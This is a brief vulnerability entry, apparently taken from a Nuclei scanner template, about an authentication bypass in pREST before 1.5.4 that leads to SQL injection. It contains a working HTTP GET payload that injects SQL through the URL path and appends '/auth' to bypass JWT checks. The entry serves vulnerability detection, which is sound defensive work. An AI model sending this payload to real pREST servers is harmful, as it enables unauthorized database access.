# Vulnerability: pREST < 1.5.4 - SQL Injection Via Authentication Bypass
**Classification:** SQLI
**Source:** Nuclei Template (`prest-sqli-auth-bypass.yaml`)

## Description
An authentication bypass vulnerability was introduced by changing the JWT whitelist configuration to use a regex pattern, allowing unauthorized access to any path containing /auth and leading to SQL Injection.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /{{database}}/information_schema".tables)s%20where%201=version()::int--/auth HTTP/1.1
Host: {{Hostname}}
```

